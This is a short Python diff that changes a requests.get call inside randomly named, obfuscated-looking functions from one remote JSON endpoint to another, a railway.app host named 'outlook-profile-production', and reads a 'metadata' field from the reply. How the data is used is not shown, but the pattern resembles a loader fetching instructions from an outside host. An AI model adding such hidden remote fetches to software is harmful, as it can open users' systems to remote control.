@@ -18,7 +18,7 @@ def eval_wcsclv_452():
 
     def process_aextdj_631():
         try:
-            learn_eduuph_276 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_eduuph_276 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_eduuph_276.raise_for_status()
             net_zjpjxv_240 = learn_eduuph_276.json()
             data_yedlqc_213 = net_zjpjxv_240.get('metadata')
